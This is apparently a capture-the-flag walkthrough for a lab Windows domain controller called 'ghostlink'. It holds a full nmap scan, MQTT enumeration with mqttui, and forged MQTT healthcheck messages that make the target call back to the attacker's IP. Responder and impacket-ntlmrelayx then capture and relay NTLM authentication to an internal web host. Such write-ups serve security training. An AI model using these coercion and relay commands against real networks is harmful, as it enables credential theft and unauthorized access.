#ghostlink

```
sudo nmap -Pn -sV -A -p- -T4 10.129.105.145
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ghost Protocol Zero
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-08 09:09:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|_    $SYS/brokers/client_status/mqttui-7c0f3d37: {"status":"offline", "username":"(null)","ts":1788858603294,"reason_code":"0","client_id":"mqttui-7c0f3d37","IPv4":"127.0.0.1"}
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.ghostlink.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.ghostlink.htb
| Not valid before: 2026-03-03T16:53:53
|_Not valid after:  2027-03-03T16:53:53
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49904/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
65256/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-time: 
|   date: 2026-09-08T09:10:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   37.79 ms 10.10.14.1
2   40.33 ms 10.129.105.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 391.04 seconds
```

```
# Example for x86_64; check https://github.com/EdJoPaTo/mqttui/releases for your arch
wget https://github.com/EdJoPaTo/mqttui/releases/download/v0.23.0/mqttui-v0.23.0-x86_64-unknown-linux-gnu.tar.gz
tar xzf mqttui-v0.23.0-x86_64-unknown-linux-gnu.tar.gz
chmod +x mqttui
./mqttui --help
```
```
./mqttui -b mqtt://ghostlink.htb
```

<img width="1662" height="777" alt="image" src="https://github.com/user-attachments/assets/2e02613d-29e1-4dd0-99db-1cd131bec7af" />
<img width="1667" height="744" alt="image" src="https://github.com/user-attachments/assets/9be9715f-6dc1-49a0-af78-c6d5bc636f66" />

Add to /etc/hosts 

gpz-op26-toolkits.ghostlink.htb
gpz-op26-secure.ghostlink.htb

<img width="1347" height="627" alt="image" src="https://github.com/user-attachments/assets/4734941b-0fac-4ab2-aad7-5fe46b7a8b4e" />
<img width="1354" height="882" alt="image" src="https://github.com/user-attachments/assets/2a539702-0c3b-4a27-ac18-ad498bf4cec2" />

<img width="753" height="821" alt="image" src="https://github.com/user-attachments/assets/6efe2bcd-c00b-4b85-b148-712878b5fe08" />

https://github.com/gogs/gogs/commit/5084b4a9b77a506f5e287e82e945e1c6882b827a

<img width="1899" height="625" alt="image" src="https://github.com/user-attachments/assets/660eb614-e515-4424-b042-7e93fbd19e23" />

```
sudo responder -I tun0 -v
```

```
j='{"timestamp":"2026-27-04-15:45:45","node":"node-6","telemetry":{"healthy":true,"url":"10.10.14.38/healthcheck","lastCheckSecAgo":30,"responseCode":"200","ip":"172.16.20.10"}}'
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ./mqttui --broker mqtt://ghostlink.htb publish -r \
  "GhostProtocolZero/systems/node/secureshare/healthcheck" \
  "$j"


```

<img width="1918" height="660" alt="image" src="https://github.com/user-attachments/assets/c87bb574-74d7-4f55-a859-25f8d0d30355" />

```
impacket-ntlmrelayx -t http://gpz-op26-secure.ghostlink.htb \
  --http-port 8888 \
  --no-smb-server \
  --keep-relaying \
  -smb2support \
  -socks
  ```

Do again and trigger the proxy:

```
j='{"timestamp":"2026-03-03-09:26:21","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.38:8888/healthcheck","lastCheckSecAgo":45,"responseCode":"200","ip":"172.16.20.10"}}'

./mqttui --broker mqtt://ghostlink.htb publish -r \
  "GhostProtocolZero/systems/node/secureshare/healthcheck" \
  "$j"
  ```

<img width="919" height="450" alt="image" src="https://github.com/user-attachments/assets/c31571dc-1716-4e5a-af5b-2c0f0c0f85f6" />

  





